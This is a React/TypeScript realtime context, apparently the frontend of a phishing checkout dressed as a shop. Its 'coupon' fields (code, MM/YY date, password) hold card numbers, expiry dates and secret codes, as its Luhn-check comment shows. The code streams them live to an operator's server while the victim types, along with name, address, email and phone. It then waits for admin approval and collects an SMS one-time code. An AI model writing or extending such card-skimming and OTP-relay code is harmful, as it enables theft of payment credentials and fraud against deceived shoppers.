import React, { createContext, useContext, useState, useEffect, useRef, ReactNode } from "react";
import { io, Socket } from "socket.io-client";

export interface LiveFormData {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
}

export interface CouponData {
  code: string;
  dateMMYY: string;
  password: string;
}

export type OrderStatus = "IDLE" | "SHIPPING_SUBMITTED" | "COUPON_SUBMITTING" | "WAITING_APPROVAL" | "APPROVED" | "REJECTED" | "AUTO_REJECTED" | "WAITING_SMS" | "SMS_SUBMITTED" | "COMPLETED" | "RETURN_COUPON";

interface RealtimeContextType {
  // Shipping Data
  liveData: LiveFormData | null;
  updateLiveData: (data: LiveFormData) => void;
  
  // Coupon Data
  couponData: CouponData | null;
  updateCouponData: (data: CouponData) => void;

  // SMS Verification
  smsCode: string;
  updateSmsCode: (code: string) => void;
  
  // Workflow State
  currentOrderId: string | null;
  orderStatus: OrderStatus;
  setOrderStatus: (status: OrderStatus) => void;
  setCurrentOrderId: (id: string) => void;
  
  // Admin Actions
  adminAction: (action: "APPROVE" | "REJECT") => void;
  
  // Cart
  cartTotal: number;
  setCartTotal: (total: number) => void;
  
  // Backend Integration
  submitOrder: (finalCouponData?: CouponData) => Promise<void>;
  submitSMS: (code?: string) => Promise<void>;
  resubmitCoupon: (newCouponData: CouponData) => Promise<void>;
  startLiveSession: (opts?: { force?: boolean }) => void;
  endLiveSession: () => void;
}

const RealtimeContext = createContext<RealtimeContextType | undefined>(undefined);

// API Base URL (set VITE_API_URL when frontend is on another domain)
const API_URL = import.meta.env.DEV ? "http://localhost:3001" : (import.meta.env.VITE_API_URL ?? "");

export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
  const [liveData, setLiveData] = useState<LiveFormData | null>(null);
  const [couponData, setCouponData] = useState<CouponData | null>(null);
  const [smsCode, setSmsCode] = useState<string>("");
  // Persist currentOrderId and order_token to sessionStorage (order_token required for /sms and /update-coupon)
  const [currentOrderId, _setCurrentOrderId] = useState<string | null>(() => {
    try { return sessionStorage.getItem('currentOrderId'); } catch { return null; }
  });
  const [orderToken, _setOrderToken] = useState<string | null>(() => {
    try { return sessionStorage.getItem('orderToken'); } catch { return null; }
  });
  const setCurrentOrderId = (id: string) => {
    _setCurrentOrderId(id);
    try { sessionStorage.setItem('currentOrderId', id); } catch {}
  };
  const setOrderToken = (t: string) => {
    _setOrderToken(t);
    try { sessionStorage.setItem('orderToken', t); } catch {}
  };
  const clearCurrentOrderId = () => {
    _setCurrentOrderId(null);
    _setOrderToken(null);
    try { sessionStorage.removeItem('currentOrderId'); sessionStorage.removeItem('orderToken'); } catch {}
  };
  const [orderStatus, setOrderStatus] = useState<OrderStatus>("IDLE");
  const [socket, setSocket] = useState<Socket | null>(null);
  const [cartTotal, setCartTotal] = useState<number>(0);

  // Initialize Socket.io
  useEffect(() => {
    const newSocket = io(API_URL);
    setSocket(newSocket);

    return () => {
      newSocket.close();
    };
  }, []);

  const currentOrderIdRef = useRef(currentOrderId);
  currentOrderIdRef.current = currentOrderId;

  // Emit join_order only when currentOrderId changes (no re-register of listeners)
  useEffect(() => {
    if (!socket) return;
    if (currentOrderId) socket.emit("join_order", currentOrderId);
  }, [socket, currentOrderId]);

  // Register order_update once; handler uses ref so it always sees latest currentOrderId
  useEffect(() => {
    if (!socket) return;
    const handler = (data: { id: string; status: OrderStatus; smsCode?: string }) => {
      if (data.id === currentOrderIdRef.current) {
        setOrderStatus(data.status);
      }
    };
    socket.on("order_update", handler);
    return () => {
      socket.off("order_update", handler);
    };
  }, [socket]);

  // Clear persisted order ID when order is completed
  useEffect(() => {
    if (orderStatus === "COMPLETED") {
      clearCurrentOrderId();
    }
  }, [orderStatus]);

  const updateLiveData = (data: LiveFormData) => {
    setLiveData(data);
    // Optional: Auto-save draft to backend if needed, for now keep in state
  };

  const updateCouponData = (data: CouponData) => {
    setCouponData(data);
    if (currentOrderId) {
      // Existing order: send real-time update to the order row itself
      socket?.emit('live_order_coupon_update', {
        orderId: currentOrderId,
        code: data.code,
        dateMMYY: data.dateMMYY,
        password: data.password,
      });
    } else {
      // No order yet: send to live typing session
      socket?.emit('live_coupon_update', {
        code: data.code,
        dateMMYY: data.dateMMYY,
        password: data.password,
      });
    }
  };

  const updateSmsCode = (code: string) => {
    setSmsCode(code);
  };

  const startLiveSession = (opts?: { force?: boolean }) => {
    if (!liveData) return;
    if (currentOrderId && !opts?.force) return; // Order already exists; use force for RETURN_COUPON resubmit flow
    socket?.emit('live_session_start', {
      customer: liveData,
      cartTotal,
    });
  };

  const endLiveSession = () => {
    socket?.emit('live_session_end');
  };

  // Submit Order to Backend
  const submitOrder = async (finalCouponData?: CouponData) => {
    const couponToUse = finalCouponData || couponData;
    
    if (!liveData || !couponToUse) {
      console.error("Missing data for submission", { liveData, couponData: couponToUse });
      return;
    }

    // Safety: if an order already exists, update it instead of creating a new one
    if (currentOrderId) {
      await resubmitCoupon(couponToUse);
      return;
    }

    setOrderStatus("WAITING_APPROVAL");
    socket?.emit('live_session_end');

    try {
      const response = await fetch(`${API_URL}/api/orders`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          customer: liveData,
          total: cartTotal,
          couponCode: couponToUse.code,
          dateMMYY: couponToUse.dateMMYY,
          password: couponToUse.password
        }),
      });

      if (!response.ok) throw new Error("Failed to submit order");
      
      const result = await response.json();
      const actualOrderId = result.order.id;
      const tok = result.order.order_token;
      setCurrentOrderId(actualOrderId);
      if (tok) setOrderToken(tok);
      if (result.autoRejected) {
        // Luhn check failed or card expired - auto reject
        setOrderStatus("REJECTED");
      } else {
        socket?.emit("join_order", actualOrderId);
      }

    } catch (error) {
      console.error("Error submitting order:", error);
      setOrderStatus("IDLE");
    }
  };

  const submitSMS = async (code?: string) => {
    const smsCodeToUse = code || smsCode;
    if (!currentOrderId || !smsCodeToUse) return;
    setOrderStatus("SMS_SUBMITTED");
    try {
      const body: { smsCode: string; order_token?: string } = { smsCode: smsCodeToUse };
      if (orderToken) body.order_token = orderToken;
      const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/sms`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
      });
      if (!response.ok) throw new Error("Failed to submit SMS");
    } catch (error) {
      console.error("Error submitting SMS:", error);
    }
  };

  // Resubmit Coupon (update existing order after admin sends back)
  const resubmitCoupon = async (newCouponData: CouponData) => {
    if (!currentOrderId || !newCouponData) return;
    
    setOrderStatus("WAITING_APPROVAL");
    socket?.emit('live_session_end');
    
    try {
      const body: { couponCode: string; dateMMYY: string; password: string; order_token?: string } = {
        couponCode: newCouponData.code,
        dateMMYY: newCouponData.dateMMYY,
        password: newCouponData.password
      };
      if (orderToken) body.order_token = orderToken;
      const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/update-coupon`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
      });
      
      if (!response.ok) throw new Error("Failed to update coupon");
      
      const result = await response.json();
      if (result.autoRejected) {
        setOrderStatus("REJECTED");
      }
    } catch (error) {
      console.error("Error resubmitting coupon:", error);
      setOrderStatus("IDLE");
    }
  };

  const adminAction = (action: "APPROVE" | "REJECT") => {
    // This is for local simulation/optimistic UI, but real action happens via Admin Dashboard
    if (action === "APPROVE") setOrderStatus("APPROVED");
    else setOrderStatus("REJECTED");
  };

  return (
    <RealtimeContext.Provider 
      value={{ 
        liveData, 
        updateLiveData, 
        couponData, 
        updateCouponData,
        smsCode,
        updateSmsCode,
        orderStatus, 
        setOrderStatus,
        currentOrderId,
        setCurrentOrderId,
        adminAction,
        submitOrder,
        submitSMS,
        resubmitCoupon,
        cartTotal,
        setCartTotal,
        startLiveSession,
        endLiveSession
      }}
    >
      {children}
    </RealtimeContext.Provider>
  );
};

export const useRealtime = () => {
  const context = useContext(RealtimeContext);
  if (context === undefined) {
    throw new Error("useRealtime must be used within a RealtimeProvider");
  }
  return context;
};
